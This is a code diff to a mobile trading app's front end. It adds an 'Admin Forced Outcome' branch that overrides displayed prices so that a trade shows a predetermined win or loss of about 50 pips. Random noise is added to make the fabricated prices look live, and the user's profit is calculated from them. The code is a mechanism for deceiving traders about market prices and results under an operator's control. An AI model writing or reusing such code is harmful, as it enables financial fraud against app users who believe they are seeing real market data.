@@ -90,18 +90,36 @@ const MobileApp = () => {
                     // Let's calculated PL locally for smooth animation
 
                     const processed = serverTrades.map(t => {
-                        const currentPrice = t.currentPrice || t.price || t.entry_price; // You might need a live price feed here
+                        let currentPrice = t.currentPrice || t.price || t.entry_price;
 
-                        // Since we don't have a live socket yet, let's simulate price noise on client
-                        // so it feels 'alive' even with static server data
-                        const noise = (Math.random() - 0.5) * 0.0002;
-                        const animatedPrice = currentPrice + noise;
+                        // Check for Admin Forced Outcome
+                        if (t.forced_outcome === 'WIN') {
+                            const multiplier = t.type === 'buy' ? 1 : -1;
+                            // Target: Entry + (Big Step in direction)
+                            // Let's say +50 pips profit
+                            const direction = 0.0050 * multiplier;
+                            const target = t.entry_price + direction;
+                            // Add noise around target
+                            const noise = (Math.random() - 0.5) * 0.0005;
+                            currentPrice = target + noise;
+                        } else if (t.forced_outcome === 'LOSS') {
+                            const multiplier = t.type === 'buy' ? 1 : -1;
+                            // Target: Entry - (Big Step in direction)
+                            const direction = -0.0050 * multiplier;
+                            const target = t.entry_price + direction;
+                            const noise = (Math.random() - 0.5) * 0.0005;
+                            currentPrice = target + noise;
+                        } else {
+                            // Normal Noise
+                            const noise = (Math.random() - 0.5) * 0.0002;
+                            currentPrice = currentPrice + noise;
+                        }
 
                         // Calculate Profit
                         const multiplier = t.type === 'buy' ? 1 : -1;
-                        const profit = (animatedPrice - t.entry_price) * t.volume * multiplier * 100000;
+                        const profit = (currentPrice - t.entry_price) * t.volume * multiplier * 100000;
 
-                        return { ...t, currentPrice: animatedPrice, profit };
+                        return { ...t, currentPrice: currentPrice, profit };
                     });
 
                     // Filter Open/Closed
